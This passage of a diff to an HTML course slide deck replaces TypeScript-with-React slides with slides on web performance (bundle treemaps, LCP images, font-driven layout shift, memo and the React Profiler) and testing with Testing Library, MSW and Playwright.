-          <li><a href="https://react.dev/learn/typescript" target="_blank" rel="noopener">Using TypeScript — react.dev</a><small>props, hooks and DOM events, typed the official way</small></li>
-          <li><a href="https://react.dev/blog/2024/12/05/react-19#ref-as-a-prop" target="_blank" rel="noopener">ref as a prop — React 19</a><small>why new components no longer need forwardRef</small></li>
-          <li><a href="https://react.dev/reference/react/forwardRef" target="_blank" rel="noopener">forwardRef — react.dev</a><small>the React 18 form you&#x27;ll still meet in codebases</small></li>
+        <ul class="plist" style="margin-top:4px">
+          <li><a href="https://web.dev/articles/vitals" target="_blank" rel="noopener" onclick="event.stopPropagation()">Web Vitals ↗</a><small>the three metrics and their thresholds</small></li>
+          <li><a href="https://web.dev/articles/inp" target="_blank" rel="noopener" onclick="event.stopPropagation()">Interaction to Next Paint (INP) ↗</a><small>what INP measures, and why it replaced FID</small></li>
+          <li><a href="https://web.dev/articles/lab-and-field-data-differences" target="_blank" rel="noopener" onclick="event.stopPropagation()">Why lab and field data can be different ↗</a><small>and what to do about it</small></li>
         </ul>
       </div>
-      <div class="card b">
-        <h3 class="b">Resources</h3>
-        <ul class="plist refs" style="margin-top:4px">
-          <li><a href="https://github.com/typescript-cheatsheets/react" target="_blank" rel="noopener">React TypeScript Cheatsheet</a><small>the community reference for every typing pattern here</small></li>
-          <li><a href="https://github.com/Catalystsw/frontend-mastery-program/tree/main/modules/06-react-typescript" target="_blank" rel="noopener">Module 6 slides</a><small>the deck this video walks through</small></li>
-        </ul>
-      </div>
-    </div>
-</section>
-
-  <section class="slide" data-chip="MODULE 06 · VIDEO 2"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 06 · VIDEO 2</div><div class="cx-page"><b>06</b> / 18</div><!--/catalyst-brand:chrome-->
-    <div class="kicker">Lesson 2 · Generic components</div>
-    <h2>One <code>Select&lt;T&gt;</code>, every option type</h2>
-    <pre style="max-width:none; font-size:14.5px"><code><span class="kw">type</span> <span class="ty">SelectProps</span>&lt;<span class="ty">T</span>&gt; = {
-  options: <span class="kw">readonly</span> <span class="ty">T</span>[];
-  value: <span class="ty">T</span> | <span class="kw">null</span>;
-  onChange: (value: <span class="ty">T</span>) =&gt; <span class="ty">void</span>;
-  getKey: (option: <span class="ty">T</span>) =&gt; <span class="ty">string</span>;     <span class="cmt">// stable id → &lt;option value&gt;</span>
-  getLabel: (option: <span class="ty">T</span>) =&gt; <span class="ty">string</span>;   <span class="cmt">// what the user reads</span>
-};
-
-<span class="kw">export function</span> <span class="fn">Select</span>&lt;<span class="ty">T</span>&gt;({ options, value, onChange, getKey, getLabel }: <span class="ty">SelectProps</span>&lt;<span class="ty">T</span>&gt;) {
-  <span class="kw">return</span> (
-    &lt;<span class="kw">select</span>
-      value={value === <span class="kw">null</span> ? <span class="st">''</span> : <span class="fn">getKey</span>(value)}
-      onChange={(e) =&gt; {
-        <span class="kw">const</span> next = options.<span class="fn">find</span>((o) =&gt; <span class="fn">getKey</span>(o) === e.target.value);
-        <span class="kw">if</span> (next !== <span class="kw">undefined</span>) <span class="fn">onChange</span>(next);   <span class="ok">// the caller gets a T back, never a string</span>
-      }}&gt;
-      &lt;<span class="kw">option</span> value=<span class="st">""</span> disabled&gt;Choose…&lt;/<span class="kw">option</span>&gt;
-      {options.<span class="fn">map</span>((o) =&gt; &lt;<span class="kw">option</span> key={<span class="fn">getKey</span>(o)} value={<span class="fn">getKey</span>(o)}&gt;{<span class="fn">getLabel</span>(o)}&lt;/<span class="kw">option</span>&gt;)}
-    &lt;/<span class="kw">select</span>&gt;
-  );
-}</code></pre>
-</section>
-
-  <section class="slide" data-chip="MODULE 06 · VIDEO 2"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 06 · VIDEO 2</div><div class="cx-page"><b>07</b> / 18</div><!--/catalyst-brand:chrome-->
-    <div class="kicker">Lesson 2 · Inference at the call site</div>
-    <h2>The call site never writes a type argument</h2>
-    <div class="two tight" style="max-width:none">
       <div class="card g">
-        <h3 class="g">T = Company</h3>
-        <pre><code><span class="kw">const</span> [company, setCompany] = <span class="fn">useState</span>&lt;<span class="ty">Company</span> | <span class="kw">null</span>&gt;(<span class="kw">null</span>);
+        <h3 class="g">Resources</h3>
+        <ul class="plist" style="margin-top:4px">
+          <li><a href="https://github.com/GoogleChrome/web-vitals" target="_blank" rel="noopener" onclick="event.stopPropagation()">web-vitals ↗</a><small>the library behind the snippet above, with its attribution build</small></li>
+          <li><a href="https://pagespeed.web.dev/" target="_blank" rel="noopener" onclick="event.stopPropagation()">PageSpeed Insights ↗</a><small>CrUX field data and a Lighthouse run for any public URL</small></li>
+        </ul>
+      </div>
+    </div>
+</section>
 
-&lt;<span class="ty">Select</span>
-  options={companies}        <span class="cmt">// Company[] → T = Company</span>
-  value={company}
-  onChange={setCompany}      <span class="cmt">// receives a Company</span>
-  getKey={(c) =&gt; c.id}       <span class="cmt">// c: Company, inferred</span>
-  getLabel={(c) =&gt; c.name}
+  <!-- L2a · READING THE BUNDLE -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 2"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 2</div><div class="cx-page"><b>05</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Lesson 2 · Reading the bundle</div>
+    <h2>Find the import that cost 300 KB</h2>
+    <div class="fig" style="max-width:1000px">
+      <svg viewBox="0 0 1000 226" role="img" aria-label="Treemap of Rasmi's main.js, 712 KB minified: rich-text editor 300 KB, react and react-dom 190 KB, app code 96 KB, every date locale 72 KB, other dependencies 54 KB">
+        <text x="0" y="14" class="lbl b" style="font-size:14px">main.js · 712 KB minified · 214 KB gzip · loaded on every page</text>
+        <rect x="2" y="26" width="415" height="196" rx="6" fill="#F8717A" fill-opacity=".16" stroke="#F8717A"/>
+        <text x="209" y="116" text-anchor="middle" class="lbl b" style="font-size:17px">Rich-text editor</text>
+        <text x="209" y="140" text-anchor="middle" class="lbl" style="font-size:14px">300 KB · used on /post-job only</text>
+        <rect x="425" y="26" width="261" height="196" rx="6" fill="#2196F3" fill-opacity=".14" stroke="#2196F3"/>
+        <text x="555" y="116" text-anchor="middle" class="lbl b" style="font-size:15px">react + react-dom</text>
+        <text x="555" y="138" text-anchor="middle" class="lbl" style="font-size:13px">190 KB</text>
+        <rect x="694" y="26" width="304" height="82" rx="6" fill="#34D399" fill-opacity=".14" stroke="#34D399"/>
+        <text x="846" y="64" text-anchor="middle" class="lbl b" style="font-size:14px">Rasmi app code</text>
+        <text x="846" y="84" text-anchor="middle" class="lbl" style="font-size:13px">96 KB</text>
+        <rect x="694" y="114" width="304" height="60" rx="6" fill="#FBBF24" fill-opacity=".14" stroke="#FBBF24"/>
+        <text x="846" y="140" text-anchor="middle" class="lbl b" style="font-size:13px">date formatting, every locale</text>
+        <text x="846" y="158" text-anchor="middle" class="lbl" style="font-size:12px">72 KB</text>
+        <rect x="694" y="180" width="304" height="42" rx="6" fill="#121C30" stroke="#64748B"/>
+        <text x="846" y="206" text-anchor="middle" class="lbl" style="font-size:12px">other dependencies · 54 KB</text>
+      </svg>
+    </div>
+    <div class="two tight">
+      <pre><code>$ vite build --sourcemap
+$ npx source-map-explorer <span class="st">'dist/assets/*.js'</span></code></pre>
+      <pre><code><span class="cmt">// src/app/routes.tsx</span>
+<span class="kw">import</span> { PostJobPage } <span class="kw">from</span> <span class="st">'@/features/post-job'</span>;
+<span class="no">// static import → in main.js, for every visitor</span></code></pre>
+    </div>
+    <div class="key w">Seekers are nearly all of Rasmi's traffic. None of them opens the employer editor, and every one of them downloads, parses and compiles it.</div>
+</section>
+
+  <!-- L3a · IMAGES -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 2"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 2</div><div class="cx-page"><b>06</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Lesson 2 · Images</div>
+    <h2>Reserve the box, rush the hero</h2>
+    <div class="two tight" style="max-width:1240px">
+      <div class="card g">
+        <h3 class="g">The job page's cover: the LCP element</h3>
+        <pre><code>&lt;<span class="ty">img</span>
+  src=<span class="st">"/covers/acme-800.avif"</span>
+  srcSet=<span class="st">"/covers/acme-400.avif 400w,
+          /covers/acme-800.avif 800w,
+          /covers/acme-1600.avif 1600w"</span>
+  sizes=<span class="st">"(max-width: 760px) 100vw, 720px"</span>
+  width={<span class="st">1600</span>} height={<span class="st">900</span>}
+  fetchPriority=<span class="st">"high"</span>
+  alt=<span class="st">"Acme's Cairo office"</span>
 /&gt;</code></pre>
       </div>
-      <div class="card p">
-        <h3 class="p">T = 'remote' | 'hybrid' | 'onsite'</h3>
-        <pre><code><span class="kw">const</span> WORK_MODES = [<span class="st">'remote'</span>, <span class="st">'hybrid'</span>, <span class="st">'onsite'</span>] <span class="kw">as const</span>;
+      <table class="grid" style="margin-top:0">
+        <tr><th>Attribute</th><th>What it fixes</th></tr>
+        <tr><td><code>width</code> + <code>height</code></td><td>The browser reserves the box from the ratio before a byte arrives. <b>CLS</b></td></tr>
+        <tr><td>no <code>loading="lazy"</code></td><td>A lazy image is only requested after layout. On the hero, that wait is pure load delay. <b>LCP</b></td></tr>
+        <tr><td><code>fetchPriority</code></td><td>Puts it ahead of below-the-fold images in the queue. <b>LCP</b></td></tr>
+        <tr><td><code>srcSet</code> + <code>sizes</code>, AVIF</td><td>A phone fetches the 400 px file, not the 1600 px JPEG. <b>LCP</b></td></tr>
+      </table>
+    </div>
+    <div class="key">Lazy-load everything below the fold, such as the 30 employer logos further down. Never lazy-load the LCP image. In a client-rendered page the <code>&lt;img&gt;</code> doesn't exist until the JS runs, so the smaller bundle from a minute ago is an LCP fix too.</div>
+</section>
 
-&lt;<span class="ty">Select</span>
-  options={WORK_MODES}
-  value={mode}
-  onChange={setMode}         <span class="cmt">// receives a WorkMode</span>
-  getKey={(m) =&gt; m}
-  getLabel={(m) =&gt; MODE_LABEL[m]}
+  <!-- L3b · FONTS AND THE CLS SCORE -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 2"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 2</div><div class="cx-page"><b>07</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Lesson 2 · Fonts and the CLS score</div>
+    <h2>A late font moves text that already painted</h2>
+    <div class="two tight" style="max-width:1240px">
+      <div class="fig" style="margin:0">
+        <svg viewBox="0 0 560 300" role="img" aria-label="A content block moves down 42 pixels in a 280 pixel viewport when the web font swaps in. Impact fraction 0.51 times distance fraction 0.15 gives a layout shift score of 0.08">
+          <rect x="10" y="10" width="200" height="280" rx="10" fill="#0E1525" stroke="#243349"/>
+          <rect x="24" y="24" width="150" height="10" rx="3" fill="#243349"/>
+          <rect x="24" y="40" width="100" height="10" rx="3" fill="#243349"/>
+          <rect x="22" y="60" width="176" height="100" rx="6" fill="none" stroke="#64748B" stroke-dasharray="5 4"/>
+          <text x="110" y="80" text-anchor="middle" class="lbl s">before · fallback font</text>
+          <rect x="22" y="102" width="176" height="100" rx="6" fill="#2196F3" fill-opacity=".16" stroke="#2196F3"/>
+          <text x="110" y="186" text-anchor="middle" class="lbl s" style="fill:#CBD5E1">after · Inter swapped in</text>
+          <path d="M184,64 L184,98" stroke="#FBBF24" stroke-width="2" fill="none"/>
+          <line x1="222" y1="60" x2="222" y2="202" stroke="#22D3EE"/>
+          <line x1="216" y1="60" x2="228" y2="60" stroke="#22D3EE"/>
+          <line x1="216" y1="202" x2="228" y2="202" stroke="#22D3EE"/>
+          <text x="110" y="280" text-anchor="middle" class="lbl s">viewport · 280 px tall</text>
+          <text x="250" y="66" class="lbl b" style="font-size:14px">impact fraction</text>
+          <text x="250" y="86" class="lbl" style="font-size:13px">before ∪ after: 142 of 280 px → 0.51</text>
+          <text x="250" y="126" class="lbl b" style="font-size:14px">distance fraction</text>
+          <text x="250" y="146" class="lbl" style="font-size:13px">moved 42 of 280 px → 0.15</text>
+          <text x="250" y="196" class="lbl b" style="font-size:14px">layout shift score</text>
+          <text x="250" y="226" class="lbl b" style="font-size:24px; fill:#FBBF24">0.51 × 0.15 = 0.08</text>
+          <text x="250" y="252" class="lbl" style="font-size:13px; fill:#F8717A">most of a 0.1 budget, from one font</text>
+        </svg>
+      </div>
+      <pre style="margin-top:0"><code><span class="kw">@font-face</span> {
+  font-family: <span class="st">'Inter'</span>;
+  src: <span class="fn">url</span>(<span class="st">'/fonts/inter.woff2'</span>) <span class="fn">format</span>(<span class="st">'woff2'</span>);
+  font-display: <span class="st">swap</span>;        <span class="cmt">/* text now, Inter later */</span>
+}
+<span class="kw">@font-face</span> {                 <span class="cmt">/* Arial, cut to Inter's size */</span>
+  font-family: <span class="st">'Inter Fallback'</span>;
+  src: <span class="fn">local</span>(<span class="st">'Arial'</span>);
+  size-adjust: <span class="st">107.4%</span>;
+  ascent-override: <span class="st">90.2%</span>;
+  descent-override: <span class="st">22.5%</span>;
+}
+<span class="ty">body</span> {
+  font-family: <span class="st">'Inter'</span>, <span class="st">'Inter Fallback'</span>, sans-serif;
+}</code></pre>
+    </div>
+    <div class="key"><code>font-display: optional</code> avoids the swap entirely. <code>swap</code> plus a metric-matched fallback keeps the font and loses the jump. Either way, preload the one file the first screen needs.</div>
+</section>
+
+  <!-- L2 · READ NEXT -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 2"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 2</div><div class="cx-page"><b>08</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Lesson 2 · Read next</div>
+    <h2>Go deeper: bundles, images and fonts</h2>
+    <div class="two">
+      <div class="card a">
+        <h3 class="cy">References</h3>
+        <ul class="plist" style="margin-top:4px">
+          <li><a href="https://web.dev/articles/reduce-javascript-payloads-with-code-splitting" target="_blank" rel="noopener" onclick="event.stopPropagation()">Reduce JavaScript payloads with code splitting ↗</a><small>route and interaction splitting</small></li>
+          <li><a href="https://web.dev/articles/optimize-cls" target="_blank" rel="noopener" onclick="event.stopPropagation()">Optimize Cumulative Layout Shift ↗</a><small>images, fonts and late content</small></li>
+          <li><a href="https://web.dev/articles/fetch-priority" target="_blank" rel="noopener" onclick="event.stopPropagation()">Optimize resource loading with the Fetch Priority API ↗</a><small>rushing the LCP image</small></li>
+        </ul>
+      </div>
+      <div class="card g">
+        <h3 class="g">Resources</h3>
+        <ul class="plist" style="margin-top:4px">
+          <li><a href="https://github.com/btd/rollup-plugin-visualizer" target="_blank" rel="noopener" onclick="event.stopPropagation()">rollup-plugin-visualizer ↗</a><small>the treemap for a Vite build</small></li>
+          <li><a href="https://react.dev/reference/react/lazy" target="_blank" rel="noopener" onclick="event.stopPropagation()">lazy — React reference ↗</a><small>including the default-export gotcha</small></li>
+        </ul>
+      </div>
+    </div>
+</section>
+
+  <!-- L4a · MEMO THAT HELPS -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 3"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 3</div><div class="cx-page"><b>09</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Lesson 3 · Memoization that helps</div>
+    <h2>memo only skips when every prop is the same</h2>
+    <div class="two tight" style="max-width:1240px">
+      <div class="card r">
+        <h3 class="r">Wrapped in memo, renders anyway</h3>
+        <pre><code><span class="kw">export const</span> JobCard = <span class="fn">memo</span>(<span class="kw">function</span> <span class="fn">JobCard</span>(props) {
+  <span class="cmt">/* … */</span>
+});
+
+&lt;<span class="ty">JobCard</span>
+  job={job}
+  isSelected={job.id === selectedId}
+  now={Date.<span class="fn">now</span>()}                  <span class="no">// ✗ new number</span>
+  onSelect={(id) =&gt; <span class="fn">setSelectedId</span>(id)} <span class="no">// ✗ new function</span>
+/&gt;</code></pre>
+      </div>
+      <div class="card g">
+        <h3 class="g">Same props, render skipped</h3>
+        <pre><code><span class="kw">const</span> now = <span class="fn">useMemo</span>(() =&gt; Date.<span class="fn">now</span>(), []);
+
+&lt;<span class="ty">JobCard</span>
+  job={job}
+  isSelected={job.id === selectedId}
+  now={now}                <span class="ok">// ✓ same number</span>
+  onSelect={setSelectedId} <span class="ok">// ✓ setters never change</span>
 /&gt;</code></pre>
       </div>
     </div>
-    <pre style="max-width:none"><code>getLabel={(c) =&gt; c.title}   <span class="no">// ❌ Property 'title' does not exist on type 'Company'.</span></code></pre>
-    <div class="key">Declare it as <code>function Select&lt;T&gt;</code>. As an arrow in a <code>.tsx</code> file it needs <code>&lt;T,&gt;</code> — otherwise the parser reads <code>&lt;T&gt;</code> as a JSX tag.</div>
+    <div class="key"><code>memo</code> compares each prop with <code>Object.is</code>. If one prop is new on every render, you pay for the comparison <i>and</i> the render. Selecting a job in Rasmi re-rendered all 120 cards before this change and 2 after it: the one that lost the highlight and the one that gained it.</div>
 </section>
 
-  <section class="slide" data-chip="MODULE 06 · VIDEO 2"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 06 · VIDEO 2</div><div class="cx-page"><b>08</b> / 18</div><!--/catalyst-brand:chrome-->
-    <div class="kicker">Lesson 2 · Polymorphic components</div>
-    <h2>One component, any element — with <code>as</code></h2>
-    <div class="two tight" style="max-width:none; grid-template-columns:1.7fr 1fr">
+  <!-- L4b · THE PROFILER -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 3"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 3</div><div class="cx-page"><b>10</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Lesson 3 · The profiler proves it</div>
+    <h2>Record one click, read the commit</h2>
+    <div class="fig" style="max-width:1000px">
+      <svg viewBox="0 0 1000 214" role="img" aria-label="React profiler flamegraph. Before: commit 42 ms, App, JobList and 120 JobCards all render. After: commit 5 ms, 2 JobCards render and 118 are skipped">
+        <text x="0" y="28" class="lbl b" style="font-size:16px">Before</text>
+        <text x="0" y="50" class="lbl" style="font-size:14px; fill:#F8717A">commit 42 ms</text>
+        <rect x="150" y="8" width="850" height="26" rx="4" fill="#2196F3" fill-opacity=".22" stroke="#2196F3"/>
+        <text x="162" y="26" class="lbl b" style="font-size:12px">App · 42 ms</text>
+        <rect x="150" y="38" width="830" height="26" rx="4" fill="#2196F3" fill-opacity=".14" stroke="#2196F3"/>
+        <text x="162" y="56" class="lbl b" style="font-size:12px">JobList · 41 ms</text>
+        <rect x="150" y="68" width="810" height="26" rx="4" fill="#FBBF24" fill-opacity=".2" stroke="#FBBF24"/>
+        <text x="162" y="86" class="lbl b" style="font-size:12px">JobCard × 120 · every one rendered</text>
+
+        <text x="0" y="142" class="lbl b" style="font-size:16px">After</text>
+        <text x="0" y="164" class="lbl" style="font-size:14px; fill:#34D399">commit 5 ms</text>
+        <rect x="150" y="122" width="101" height="26" rx="4" fill="#2196F3" fill-opacity=".22" stroke="#2196F3"/>
+        <text x="262" y="140" class="lbl b" style="font-size:12px">App · 5 ms</text>
+        <rect x="150" y="152" width="97" height="26" rx="4" fill="#2196F3" fill-opacity=".14" stroke="#2196F3"/>
+        <text x="262" y="170" class="lbl b" style="font-size:12px">JobList · 4.8 ms</text>
+        <rect x="150" y="182" width="16" height="26" rx="3" fill="#34D399" fill-opacity=".3" stroke="#34D399"/>
+        <rect x="172" y="182" width="680" height="26" rx="4" fill="none" stroke="#64748B" stroke-dasharray="4 4"/>
+        <text x="184" y="200" class="lbl" style="font-size:12px">JobCard × 2 rendered · × 118 grey: did not render</text>
+      </svg>
+    </div>
+    <div class="two tight">
+      <pre><code>&lt;<span class="ty">Profiler</span> id=<span class="st">"JobList"</span>
+  onRender={(id, phase, actualDuration) =&gt;
+    console.<span class="fn">log</span>(id, phase, actualDuration)}&gt;
+  &lt;<span class="ty">JobList</span> {...props} /&gt;
+&lt;/<span class="ty">Profiler</span>&gt;</code></pre>
+      <div class="key g" style="margin-top:14px">In React DevTools, Profiler settings, tick <b>“Record why each component rendered”</b> to see which prop changed. Profile with 4× CPU slowdown, because your laptop flatters you.</div>
+    </div>
+</section>
+
+  <!-- L3 · READ NEXT -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 3"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 3</div><div class="cx-page"><b>11</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Lesson 3 · Read next</div>
+    <h2>Go deeper: memo and the profiler</h2>
+    <div class="two">
       <div class="card a">
-        <h3 class="cy">The props follow the element</h3>
-        <pre><code><span class="kw">type</span> <span class="ty">TextProps</span>&lt;<span class="ty">E</span> <span class="kw">extends</span> <span class="ty">ElementType</span>&gt; = { as?: <span class="ty">E</span> } &amp; <span class="ty">ComponentPropsWithoutRef</span>&lt;<span class="ty">E</span>&gt;;
+        <h3 class="cy">References</h3>
+        <ul class="plist" style="margin-top:4px">
+          <li><a href="https://react.dev/reference/react/memo" target="_blank" rel="noopener" onclick="event.stopPropagation()">memo — React reference ↗</a><small>how props are compared, and when memo is pointless</small></li>
+          <li><a href="https://react.dev/reference/react/useMemo" target="_blank" rel="noopener" onclick="event.stopPropagation()">useMemo — React reference ↗</a><small>including the 1 ms rule</small></li>
+          <li><a href="https://react.dev/reference/react/Profiler" target="_blank" rel="noopener" onclick="event.stopPropagation()">&lt;Profiler&gt; — React reference ↗</a><small>measuring renders in code</small></li>
+        </ul>
+      </div>
+      <div class="card g">
+        <h3 class="g">Resources</h3>
+        <ul class="plist" style="margin-top:4px">
+          <li><a href="https://react.dev/learn/react-developer-tools" target="_blank" rel="noopener" onclick="event.stopPropagation()">React Developer Tools ↗</a><small>the Profiler tab used in the video</small></li>
+          <li><a href="https://react.dev/reference/react/useDeferredValue" target="_blank" rel="noopener" onclick="event.stopPropagation()">useDeferredValue — React reference ↗</a><small>the fix for typing that feels sticky</small></li>
+        </ul>
+      </div>
+    </div>
+</section>
 
-<span class="kw">function</span> <span class="fn">Text</span>&lt;<span class="ty">E</span> <span class="kw">extends</span> <span class="ty">ElementType</span> = <span class="st">'span'</span>&gt;({ as, ...rest }: <span class="ty">TextProps</span>&lt;<span class="ty">E</span>&gt;) {
-  <span class="kw">const</span> <span class="ty">Tag</span> = as ?? <span class="st">'span'</span>;
-  <span class="kw">return</span> &lt;<span class="ty">Tag</span> {...rest} /&gt;;
-}
+  <!-- L5b · BEHAVIOUR, NOT IMPLEMENTATION -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 4"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 4</div><div class="cx-page"><b>12</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Lesson 4 · Behaviour, not implementation</div>
+    <h2>Test what the user sees, not how you built it</h2>
+    <div class="two tight" style="max-width:1240px">
+      <div class="card r">
+        <h3 class="r">Breaks on every refactor</h3>
+        <pre><code><span class="kw">const</span> { container } = <span class="fn">render</span>(&lt;<span class="ty">App</span> /&gt;);
+<span class="kw">const</span> cards = container.<span class="fn">querySelectorAll</span>(<span class="st">'.job-card'</span>);
 
-&lt;<span class="ty">Text</span> as=<span class="st">"a"</span> href=<span class="st">"/listings/42"</span>&gt;Senior React Engineer&lt;/<span class="ty">Text</span>&gt;  <span class="ok">// href ✓</span>
-&lt;<span class="ty">Text</span> as=<span class="st">"label"</span> htmlFor=<span class="st">"q"</span>&gt;Search&lt;/<span class="ty">Text</span>&gt;                     <span class="ok">// htmlFor ✓</span>
-&lt;<span class="ty">Text</span> href=<span class="st">"/listings/42"</span>&gt;Oops&lt;/<span class="ty">Text</span>&gt;                          <span class="no">// ❌ no href on a span</span></code></pre>
+fireEvent.<span class="fn">click</span>(cards[<span class="st">2</span>]);
+<span class="fn">expect</span>(cards[<span class="st">2</span>]).<span class="fn">toHaveClass</span>(<span class="st">'is-selected'</span>);
+
+<span class="no">// rename a class or re-sort the list → red,</span>
+<span class="no">// though nothing a user sees has changed</span></code></pre>
+      </div>
+      <div class="card g">
+        <h3 class="g">Breaks only when the feature does</h3>
+        <pre><code><span class="kw">const</span> user = userEvent.<span class="fn">setup</span>();
+<span class="fn">render</span>(&lt;<span class="ty">App</span> /&gt;);
+
+<span class="kw">await</span> user.<span class="fn">click</span>(<span class="kw">await</span> screen.<span class="fn">findByRole</span>(<span class="st">'button'</span>,
+  { name: <span class="st">/^React Engineer/</span> }));
+<span class="kw">await</span> user.<span class="fn">click</span>(
+  screen.<span class="fn">getByRole</span>(<span class="st">'button'</span>, { name: <span class="st">'Apply now'</span> }));
+
+<span class="fn">expect</span>(<span class="kw">await</span> screen.<span class="fn">findByRole</span>(<span class="st">'button'</span>,
+  { name: <span class="st">/Application sent/</span> })).<span class="fn">toBeDisabled</span>();</code></pre>
+      </div>
+    </div>
+    <div class="key g">Swap <code>useState</code> for a reducer, split <code>JobCard</code> in two or rename every class, and the right-hand test stays green. It goes red only when a seeker can no longer find a role and apply.</div>
+</section>
+
+  <!-- L6a · MSW -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 4"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 4</div><div class="cx-page"><b>13</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Lesson 4 · MSW</div>
+    <h2>Mock the network, not your fetch function</h2>
+    <div class="two tight" style="max-width:1240px">
+      <pre><code><span class="cmt">// src/test/handlers.ts</span>
+<span class="kw">import</span> { http, HttpResponse } <span class="kw">from</span> <span class="st">'msw'</span>;
+
+<span class="kw">export const</span> handlers = [
+  http.<span class="fn">get</span>(<span class="st">'/api/jobs'</span>, ({ request }) =&gt; {
+    <span class="kw">const</span> q = <span class="kw">new</span> <span class="ty">URL</span>(request.url).searchParams.<span class="fn">get</span>(<span class="st">'q'</span>);
+    <span class="kw">return</span> HttpResponse.<span class="fn">json</span>(<span class="fn">search</span>(jobs, q ?? <span class="st">''</span>));
+  }),
+];
+
+<span class="cmt">// src/test/setup.ts · setupServer from 'msw/node'</span>
+<span class="kw">export const</span> server = <span class="fn">setupServer</span>(...handlers);
+<span class="fn">beforeAll</span>(() =&gt; server.<span class="fn">listen</span>({ onUnhandledRequest: <span class="st">'error'</span> }));
+<span class="fn">afterEach</span>(() =&gt; server.<span class="fn">resetHandlers</span>());
+<span class="fn">afterAll</span>(() =&gt; server.<span class="fn">close</span>());</code></pre>
+      <pre><code><span class="fn">it</span>(<span class="st">'shows a retry when the API fails'</span>, <span class="kw">async</span> () =&gt; {
+  server.<span class="fn">use</span>(
+    http.<span class="fn">get</span>(<span class="st">'/api/jobs'</span>, () =&gt;
+      <span class="kw">new</span> <span class="ty">HttpResponse</span>(<span class="kw">null</span>, { status: <span class="st">500</span> })),
+  );
+  <span class="fn">render</span>(&lt;<span class="ty">App</span> /&gt;);
+
+  <span class="fn">expect</span>(<span class="kw">await</span> screen.<span class="fn">findByRole</span>(<span class="st">'alert'</span>))
+    .<span class="fn">toHaveTextContent</span>(<span class="st">/try again/i</span>);
+});
+<span class="ok">// one test, one override, reset afterwards</span></code></pre>
+    </div>
+    <div class="key">The real <code>fetchJobs</code>, <code>fetch</code>, JSON parsing and error branch all run. Only the server is fake. The same handlers run in the browser through <code>setupWorker</code> from <code>msw/browser</code>.</div>
+</section>
+
+  <!-- L6b · PLAYWRIGHT -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 4"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 4</div><div class="cx-page"><b>14</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Lesson 4 · Playwright</div>
+    <h2>One real browser, one journey that matters</h2>
+    <div class="two tight" style="max-width:1240px">
+      <pre><code><span class="kw">import</span> { test, expect } <span class="kw">from</span> <span class="st">'@playwright/test'</span>;
+
+<span class="fn">test</span>(<span class="st">'a seeker finds a role and applies'</span>, <span class="kw">async</span> ({ page }) =&gt; {
+  <span class="kw">await</span> page.<span class="fn">goto</span>(<span class="st">'/'</span>);
+  <span class="kw">await</span> page.<span class="fn">getByRole</span>(<span class="st">'combobox'</span>, { name: <span class="st">'Search jobs'</span> })
+    .<span class="fn">fill</span>(<span class="st">'react'</span>);
+  <span class="kw">await</span> page.<span class="fn">getByRole</span>(<span class="st">'button'</span>, { name: <span class="st">/^React Engineer/</span> })
+    .<span class="fn">click</span>();
+  <span class="kw">await</span> page.<span class="fn">getByRole</span>(<span class="st">'button'</span>, { name: <span class="st">'Apply now'</span> }).<span class="fn">click</span>();
+  <span class="kw">await</span> <span class="fn">expect</span>(page.<span class="fn">getByRole</span>(<span class="st">'button'</span>,
+    { name: <span class="st">/Application sent/</span> })).<span class="fn">toBeDisabled</span>();
+});</code></pre>
+      <pre><code><span class="cmt">// playwright.config.ts</span>
+<span class="kw">export default</span> <span class="fn">defineConfig</span>({
+  retries: process.env.CI ? <span class="st">2</span> : <span class="st">0</span>,
+  use: {
+    baseURL: <span class="st">'http://localhost:4173'</span>,
+    trace: <span class="st">'on-first-retry'</span>,
+  },
+  webServer: {
+    command: <span class="st">'pnpm build &amp;&amp; pnpm preview'</span>,
